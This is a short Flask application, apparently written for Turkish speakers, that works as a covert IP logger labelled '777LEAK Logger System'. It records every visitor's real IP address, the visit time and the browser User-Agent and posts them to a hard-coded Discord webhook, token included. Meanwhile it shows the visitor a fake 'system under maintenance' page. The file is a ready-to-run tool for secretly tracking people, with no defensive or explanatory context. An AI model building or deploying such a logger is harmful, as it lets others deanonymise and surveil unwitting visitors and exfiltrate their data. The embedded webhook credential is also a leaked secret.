from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

# Buraya Discord kanalından aldığın Webhook URL'sini yapıştır
DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1484282391496233053/okuloaFgP9U_EqWit5KTyiE_uTGXG97cfiwTasTyACDmxdQQQh72LH9_mZrYNQ5yydsW"

@app.route('/')
def index():
    # Kullanıcının gerçek IP adresini yakala
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        user_ip = request.remote_addr

    # Discord'a gönderilecek veri paketi
    payload = {
        "embeds": [
            {
                "title": "🌐 Yeni Giriş Tespit Edildi!",
                "color": 16711818,  # Pembe/Magenta renk kodu
                "fields": [
                    {"name": "IP Adresi", "value": f"`{user_ip}`", "inline": True},
                    {"name": "Zaman", "value": datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "inline": True},
                    {"name": "Cihaz Bilgisi", "value": request.headers.get('User-Agent'), "inline": False}
                ],
                "footer": {"text": "777LEAK Logger System"}
            }
        ]
    }

    # Veriyi Discord'a post et
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Hata oluştu: {e}")

    # Kullanıcının göreceği basit bir sayfa
    return """
    <body style="background-color: #000; color: #ff00ff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
        <div style="text-align: center; border: 2px solid #ff00ff; padding: 50px;">
            <h1>SİSTEM BAKIMDA</h1>
            <p>Lütfen daha sonra tekrar deneyiniz.</p>
        </div>
    </body>
    """

if __name__ == '__main__':
    # Localde test etmek için 5000 portunda çalıştırır
    app.run(host='0.0.0.0', port=5000)